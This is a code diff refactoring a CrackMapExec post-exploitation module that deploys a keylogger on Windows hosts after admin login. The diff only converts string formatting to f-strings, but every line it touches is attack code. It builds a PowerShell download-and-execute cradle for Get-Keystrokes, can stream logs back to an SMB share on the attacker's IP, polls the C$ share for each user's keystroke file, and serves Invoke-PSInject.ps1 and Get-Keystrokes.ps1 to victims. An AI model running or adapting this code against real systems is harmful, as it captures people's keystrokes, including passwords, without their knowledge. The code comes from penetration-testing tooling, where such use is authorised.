@@ -51,12 +51,13 @@ class CMEModule:
             self.file_name = gen_random_string(5)
 
     def on_admin_login(self, context, connection):
-        keys_folder = 'get_keystrokes_{}'.format(connection.host)
+        keys_folder = f'get_keystrokes_{connection.host}'
 
-        if not self.stream:
-            command = 'Get-Keystrokes -LogPath "$Env:Temp\\{}" -Timeout {}'.format(self.file_name, self.timeout)
-        else:
-            command = 'Get-Keystrokes -LogPath \\\\{}\\{}\\{}\\keys.log -Timeout {}'.format(context.localip, self.share_name, keys_folder, self.timeout)
+        command = (
+            f'Get-Keystrokes -LogPath \\\\{context.localip}\\{self.share_name}\\{keys_folder}\\keys.log -Timeout {self.timeout}'
+            if self.stream
+            else f'Get-Keystrokes -LogPath "$Env:Temp\\{self.file_name}" -Timeout {self.timeout}'
+        )
 
         keys_command = gen_ps_iex_cradle(context, 'Get-Keystrokes.ps1', command, post_back=False)
 
@@ -73,33 +74,37 @@ class CMEModule:
                 while True:
                     for user in users:
                         if '$' not in user.wkui1_username and os.path.exists(keys_folder_path):
-                            keys_log = os.path.join(keys_folder_path, 'keys_{}.log'.format(user.wkui1_username))
+                            keys_log = os.path.join(keys_folder_path, f'keys_{user.wkui1_username}.log')
 
                             with open(keys_log, 'a+') as key_file:
-                                file_path = '/Users/{}/AppData/Local/Temp/{}'.format(user.wkui1_username, self.file_name)
+                                file_path = f'/Users/{user.wkui1_username}/AppData/Local/Temp/{self.file_name}'
                                 try:
                                     connection.conn.getFile('C$', file_path, key_file.write)
-                                    context.log.success('Got keys! Stored in {}'.format(keys_log))
+                                    context.log.success(f'Got keys! Stored in {keys_log}')
                                 except Exception as e:
-                                    context.log.debug('Error retrieving key file contents from {}: {}'.format(file_path, e))
+                                    context.log.debug(f'Error retrieving key file contents from {file_path}: {e}')
 
                     sleep(self.poll)
             except KeyboardInterrupt:
                 pass
 
     def on_request(self, context, request):
-        if 'Invoke-PSInject.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-PSInject.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(self.ps_script1)
 
-        elif 'Get-Keystrokes.ps1' == request.path[1:]:
+        elif request.path[1:] == 'Get-Keystrokes.ps1':
             request.send_response(200)
             request.end_headers()
 
             # We received the callback, so lets setup the folder to store the keys
-            keys_folder_path = os.path.join(context.log_folder_path, 'get_keystrokes_{}'.format(request.client_address[0]))
+            keys_folder_path = os.path.join(
+                context.log_folder_path,
+                f'get_keystrokes_{request.client_address[0]}',
+            )
+
             if not os.path.exists(keys_folder_path): os.mkdir(keys_folder_path)
 
             request.wfile.write(self.ps_script2)
